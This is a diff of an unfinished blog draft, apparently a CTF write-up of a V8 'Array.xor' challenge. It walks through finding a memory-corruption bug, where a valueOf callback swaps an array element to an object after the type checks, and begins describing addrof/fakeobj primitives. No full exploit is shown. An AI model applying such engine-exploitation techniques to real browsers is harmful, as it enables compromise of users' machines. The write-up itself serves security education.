@@ -9,7 +9,7 @@ summary = "todo: fill this and also the date"
 
 Despite having 7 Chrome CVEs, I've never actually exploited a memory corruption in it's [V8 JavaScript engine](https://v8.dev/) before. [Baby array.xor](https://github.com/ECSC2024/openECSC-2024)<!-- TODO: link -->, a challenge at this year's openECSC CTF, was my first time going from a V8 bug to popping a `/bin/sh` shell.
 
-Most V8 exploits tend to have two parts to them - figuring out a unique way to trigger some sort of a memory corruption of a single byte, and then following a common pattern of building upon that corruption to read arbitrary addresses (`addrof`), create fake objects (`fakeobj`), and eventually reach arbitrary code execution. This challenge was no different.
+Most V8 exploits tend to have two sides to them - figuring out a unique way to trigger some sort of a memory corruption of at least one byte, and then following a common pattern of building upon that corruption to read arbitrary addresses (`addrof`), create fake objects (`fakeobj`), and eventually reach arbitrary code execution. This challenge was no different.
 
 <div class="challDetails">
 	<div class="challTitle challHr">Baby Array.xor</div>
@@ -139,7 +139,7 @@ The patch adds a new `Array.xor()` prototype that can be used to xor all values 
 <  (3) [0.10000000000001079, 0.20000000000002158, 0.30000000000004035]
 ```
 
-Seems to work as expected! It may be a little unintuitive at first if you aren't familiar with [IEEE 754](https://en.wikipedia.org/wiki/IEEE_754) [doubles](https://en.wikipedia.org/wiki/Double-precision_floating-point_format), but it makes a lot more sense once we look at the binary representations of the values:
+Quite the peculiar feature. It may seem a little confusing if you aren't familiar with [IEEE 754](https://en.wikipedia.org/wiki/IEEE_754) [doubles](https://en.wikipedia.org/wiki/Double-precision_floating-point_format), but it makes sense once we look at the binary representations of the values:
 <!-- todo: highlight XOR bits in red -->
 ```js
 (double) 0.1 ^ (uint64) 5 = (double) 0.10000000000001079
@@ -148,9 +148,9 @@ Seems to work as expected! It may be a little unintuitive at first if you aren't
 = 11111110111001100110011001100110011001100110011001110010100011
 ```
 
-Quite the peculiar feature. XORing doubles in an array isn't going to get us anywhere though as they are stored in a doubles array (`PACKED_DOUBLE_ELEMENTS`) as just themselves. All we can do is change some numbers around in an array we can already just modify to our will.
+Hmm, XORing doubles isn't going to get us anywhere[^1] though as the values are stored in a doubles array (`PACKED_DOUBLE_ELEMENTS`[^2]) as just raw doubles. All we can do is change some numbers around in an array, but that's something we can already do without xor. It'd be a lot more interesting if we could run this xor thing on a mixed array (`PACKED_ELEMENTS`) consisting of memory pointers to other objects, since we could point the pointers to places in memory we're not supposed to.
 
-Alright, let's see if we can break it somehow. To achieve memory corruption, we must somehow use this xor functionality on an array that has other kinds of elements in it (`PACKED_ELEMENTS`). We'll see later why that is, but for now let's just try to find a way to do it.
+<!-- Alright, let's see if we can break it somehow.  .To achieve memory corruption, we must somehow use this xor functionality on an array that has other kinds of elements in it . We'll see later why that is, but for now let's just try to find a way to do it. -->
 
 So let's try a simple array with an object in it:
 
@@ -169,12 +169,83 @@ Hmm, seems like there's a check in-place to prevent us from doing this:
   }
 ```
 
-But what if we try to create an object that *pretends* to be a double array?
+But what if we do create a double array, but then wrap it in an evil [proxy](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy)?
 
-```c
-> evil = { valueOf: () => [1.1] }
+```js
+> arr = [0.1, 0.2, 0.3]
+> evilHandler = {
+		get(target, prop, receiver) {
+			console.log(`Got '${prop}'!`);
+			return Reflect.get(...arguments);
+		}
+	}
+> evil = new Proxy(arr, evilHandler);
+> evil
+  Got 'constructor'!
+  Got 'constructor'!
+  Got 'length'!
+  Got '0'!
+  Got 'length'!
+  Got '1'!
+  Got 'length'!
+  Got '2'!
+  Got 'length'!
+< [0.1, 0.2, 0.3] // hehe looks good
+> evil.xor(1337)
+  Got 'xor'!
+< TypeError: Nope
 ```
 
+No dice, seems like they've thought of that too:
+
+```c
+if (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, JSArray::cast(*receiver))) {
+  THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+    factory->NewStringFromAsciiChecked("Nope")));
+}
+```
+
+The `IsJSArray` method makes sure that we are in fact passing an array, and the `HasOnlySimpleReceiverElements` method checks for anything sus[^3] within the array or it's prototype.
+
+Hmmph, this seems pretty well coded so far. There is no way for us to get anything other than a basic double array past these checks, and xoring such an array isn't going to accomplish anything. I went on to carefully examine other parts of the code for any possible flaws.
+
+The length of the array gets stored in a `uint32_t`, and I thought that perhaps we could overflow this value, but it turns out you can't make an array that big:
+
+```js
+> arr = new Array(2**32)
+< RangeError: Invalid array length
+```
+
+I also tried messing with the length value, but v8 doesn't allow us to do that in a way that could be of use here:
+
+```js
+> arr = [1.1, 2.2, 3.3]
+> arr.length = "evil"
+< RangeError: Invalid array length
+> arr.__defineGetter__("length", () => 1337);
+< TypeError: Cannot redefine property: length
+> arr.length = 1337 // our array is now a HOLEY_DOUBLE_ELEMENTS
+> arr.xor(1337)
+< TypeError: Array.xor needs array of double numbers
+```
+
+And then it hit me - we're only doing all these checks on the array itself, not the argument! We get the argument to xor with (`Object::ToNumber(isolate, args.at(1))`) *after* we're already past all the previous checks, so perhaps we could take our double array and change it so something more interesting here? Let's give it a shot:
+
+```js
+> arr = [1.1, 2.2, 3.3]
+> evil = { valueOf: () => { arr[0] = {}; return 1337 } }
+> arr.xor(evil)
+> arr
+< [139350, 2.2, 139390] 
+```
+
+We're cooking!
+
+## Part 2: Cooking up some primitives
+
+Now that we've found a way to mess with the pointers in an array, we must figure out a way to turn them into the `addrof` and `fakeobj` primitives. There are a few different ways to accomplish this from here. I'm going to go with the path I took originally, but see if you can figure out any other ones - I'll share a couple at the end of the post.
+
+So what are these exploit primitives? `addrof` lets us see the memory address of any object, and `fakeobj` lets us - they're kind of like memory read and write functions, but not quite.
 
 <!--
 
@@ -184,8 +255,15 @@ other solutions:
  - rdjgr: change length
  - popax21: flip obj/ptr bit
 
+--allow-natives-syntax
+
 -->
 
+[^1]: If we could modify a boxed double - a special double that can also be tagged as a pointer - we could already use xor to corrupt memory, but `PACKED_DOUBLE_ELEMENTS` in V8 uses unboxed doubles.
+
+[^2]: `PACKED_DOUBLE_ELEMENTS` means that the array consists of doubles only, and it also doesn't have any empty "holes". A double array with holes would be `HOLEY_DOUBLE_ELEMENTS` instead.
+
+[^3]: [HasOnlySimpleReceiverElements](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/builtins/builtins-array.cc;l=42;drc=fe67713b2ff62f8ba290607bf7482a8efd0ca6cc) makes sure that there are no accessors on any of the elements, and that the array's prototype hasn't been modified.
 
 <style>
 	.challDetails {
